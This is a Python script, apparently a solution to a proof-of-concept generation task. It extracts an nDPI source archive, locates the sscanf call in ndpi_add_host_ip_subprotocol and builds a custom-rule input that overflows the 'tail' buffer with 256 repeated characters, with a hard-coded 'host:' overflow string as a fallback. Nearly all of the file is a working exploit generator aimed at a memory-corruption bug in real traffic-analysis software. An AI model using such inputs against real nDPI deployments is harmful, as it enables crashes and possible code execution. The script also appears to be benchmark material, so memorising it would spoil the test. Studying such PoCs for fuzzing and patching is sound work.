import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        def fallback_poc() -> bytes:
            # A reasonably structured fallback that might hit typical ndpi custom rule parsers
            base = "host:www.example.com/"
            overflow = "A" * 256
            return (base + overflow).encode("ascii", "replace")

        def eval_c_string_literals(expr: str) -> str:
            # Concatenate and unescape all C string literals in expression
            res = []
            n = len(expr)
            i = 0

            while i < n:
                if expr[i] != '"':
                    i += 1
                    continue
                i += 1  # skip opening quote
                esc = False
                while i < n:
                    c = expr[i]
                    if esc:
                        if c == 'n':
                            res.append('\n')
                        elif c == 't':
                            res.append('\t')
                        elif c == 'r':
                            res.append('\r')
                        elif c == '\\':
                            res.append('\\')
                        elif c == '"':
                            res.append('"')
                        elif c == "'":
                            res.append("'")
                        elif c in '01234567':
                            # Octal escape: up to 3 digits including this one
                            j = i
                            oct_digits = ""
                            k = 0
                            while j < n and k < 3 and expr[j] in '01234567':
                                oct_digits += expr[j]
                                j += 1
                                k += 1
                            try:
                                res.append(chr(int(oct_digits, 8)))
                            except Exception:
                                pass
                            i = j - 1
                        elif c == 'x':
                            j = i + 1
                            hex_digits = ""
                            while j < n and expr[j] in '0123456789abcdefABCDEF':
                                hex_digits += expr[j]
                                j += 1
                            if hex_digits:
                                try:
                                    res.append(chr(int(hex_digits, 16)))
                                except Exception:
                                    pass
                                i = j - 1
                            else:
                                res.append('x')
                        else:
                            res.append(c)
                        esc = False
                    else:
                        if c == '\\':
                            esc = True
                        elif c == '"':
                            break
                        else:
                            res.append(c)
                    i += 1
                if i < n and expr[i] == '"':
                    i += 1  # skip closing quote
            return ''.join(res)

        def split_args(s: str):
            args = []
            cur = []
            nesting = 0
            in_str = False
            esc = False
            for ch in s:
                if in_str:
                    cur.append(ch)
                    if esc:
                        esc = False
                    elif ch == '\\':
                        esc = True
                    elif ch == '"':
                        in_str = False
                    continue
                if ch == '"':
                    in_str = True
                    cur.append(ch)
                    continue
                if ch in '([{':
                    nesting += 1
                    cur.append(ch)
                    continue
                if ch in ')]}':
                    nesting -= 1
                    cur.append(ch)
                    continue
                if ch == ',' and nesting == 0:
                    arg = ''.join(cur).strip()
                    if arg:
                        args.append(arg)
                    cur = []
                    continue
                cur.append(ch)
            last = ''.join(cur).strip()
            if last:
                args.append(last)
            return args

        def build_poc_from_fmt(fmt: str, tail_var_pos: int) -> str:
            result = []
            i = 0
            vararg_pos = 0
            tail_done = False

            def pick_char_for_charset(content: str, complement: bool) -> str:
                if complement:
                    banned = set()
                    i2 = 0
                    ln = len(content)
                    while i2 < ln:
                        c2 = content[i2]
                        if i2 + 2 < ln and content[i2 + 1] == '-' and content[i2 + 2] != ']':
                            start = ord(content[i2])
                            end = ord(content[i2 + 2])
                            for code in range(start, end + 1):
                                banned.add(chr(code))
                            i2 += 3
                        else:
                            banned.add(c2)
                            i2 += 1
                    for cand in ['A', 'B', 'C', '1', '2', '3', '.', '_', 'x']:
                        if cand not in banned:
                            return cand
                    return 'Z'
                else:
                    allowed = set()
                    i2 = 0
                    ln = len(content)
                    while i2 < ln:
                        c2 = content[i2]
                        if i2 + 2 < ln and content[i2 + 1] == '-' and content[i2 + 2] != ']':
                            start = ord(content[i2])
                            end = ord(content[i2 + 2])
                            for code in range(start, end + 1):
                                allowed.add(chr(code))
                            i2 += 3
                        else:
                            allowed.add(c2)
                            i2 += 1
                    for cand in ['1', '0', '2', '.', 'A', 'a', 'B']:
                        if cand in allowed:
                            return cand
                    if allowed:
                        return next(iter(allowed))
                    return '1'

            while i < len(fmt) and not tail_done:
                c = fmt[i]
                if c != '%':
                    if c.isspace():
                        result.append(' ')
                    else:
                        result.append(c)
                    i += 1
                else:
                    if i + 1 < len(fmt) and fmt[i + 1] == '%':
                        result.append('%')
                        i += 2
                        continue
                    j = i + 1
                    suppressed = False
                    if j < len(fmt) and fmt[j] == '*':
                        suppressed = True
                        j += 1
                    while j < len(fmt) and fmt[j].isdigit():
                        j += 1
                    if j + 1 < len(fmt) and fmt[j:j + 2] in ('hh', 'll'):
                        j += 2
                    elif j < len(fmt) and fmt[j] in 'hljztL':
                        j += 1
                    if j >= len(fmt):
                        break
                    spec = fmt[j]
                    j += 1
                    charset_content = None
                    charset_complement = False
                    if spec == '[':
                        charset_start = j
                        if j < len(fmt) and fmt[j] == '^':
                            charset_complement = True
                            j += 1
                        if j < len(fmt) and fmt[j] == ']':
                            j += 1
                        while j < len(fmt) and fmt[j] != ']':
                            j += 1
                        charset_end = j
                        if j < len(fmt) and fmt[j] == ']':
                            j += 1
                        charset_content = fmt[charset_start:charset_end]

                    conv_varpos = None
                    if not suppressed:
                        conv_varpos = vararg_pos
                        vararg_pos += 1

                    is_tail_conv = (conv_varpos == tail_var_pos)

                    if spec in 'diuoxX':
                        seg = '1'
                    elif spec in 'fFeEgGaA':
                        seg = '1.0'
                    elif spec in 'cC':
                        seg = 'A'
                    elif spec == 's':
                        seg = 'A'
                    elif spec == '[':
                        seg = pick_char_for_charset(charset_content or '', charset_complement)
                    elif spec == 'p':
                        seg = '0'
                    elif spec == 'n':
                        seg = ''
                    else:
                        seg = 'A'

                    if is_tail_conv:
                        base_char = seg[0] if seg else 'A'
                        seg = base_char * 256
                        tail_done = True

                    result.append(seg)
                    i = j

            return ''.join(result)

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                try:
                    with tarfile.open(src_path, 'r:*') as tf:
                        tf.extractall(tmpdir)
                except Exception:
                    return fallback_poc()

                ndpi_main_path = None
                for root, _, files in os.walk(tmpdir):
                    if 'ndpi_main.c' in files:
                        ndpi_main_path = os.path.join(root, 'ndpi_main.c')
                        break

                if not ndpi_main_path or not os.path.isfile(ndpi_main_path):
                    return fallback_poc()

                try:
                    with open(ndpi_main_path, 'r', encoding='latin1') as f:
                        text = f.read()
                except Exception:
                    return fallback_poc()

                func_name = 'ndpi_add_host_ip_subprotocol'
                idx = text.find(func_name)
                if idx == -1:
                    return fallback_poc()

                brace_start = text.find('{', idx)
                if brace_start == -1:
                    return fallback_poc()

                depth = 1
                i = brace_start + 1
                while i < len(text) and depth > 0:
                    ch = text[i]
                    if ch == '{':
                        depth += 1
                    elif ch == '}':
                        depth -= 1
                    i += 1
                body = text[brace_start + 1:i - 1]

                # Detect sscanf/scanf_common call that writes to 'tail'
                scan_calls = []
                for m in re.finditer(r'(sscanf|scanf_common)\s*\(([^;]*?)\);', body, flags=re.DOTALL):
                    args_section = m.group(2)
                    if re.search(r'\btail\b', args_section):
                        scan_calls.append(args_section)
                if not scan_calls:
                    for m in re.finditer(r'__isoc99_sscanf\s*\(([^;]*?)\);', body, flags=re.DOTALL):
                        args_section = m.group(1)
                        if re.search(r'\btail\b', args_section):
                            scan_calls.append(args_section)
                if not scan_calls:
                    return fallback_poc()

                call_args = scan_calls[0]
                args = split_args(call_args)
                if len(args) < 3:
                    return fallback_poc()

                tail_idx = None
                for idx_a, arg in enumerate(args):
                    if re.search(r'\btail\b', arg):
                        tail_idx = idx_a
                        break
                if tail_idx is None or tail_idx < 2:
                    return fallback_poc()

                fmt_expr = args[1]
                fmt = eval_c_string_literals(fmt_expr)
                if not fmt:
                    return fallback_poc()

                tail_var_pos = tail_idx - 2
                poc_str = build_poc_from_fmt(fmt, tail_var_pos)
                if not poc_str:
                    return fallback_poc()

                return poc_str.encode('ascii', 'replace')
        except Exception:
            return fallback_poc()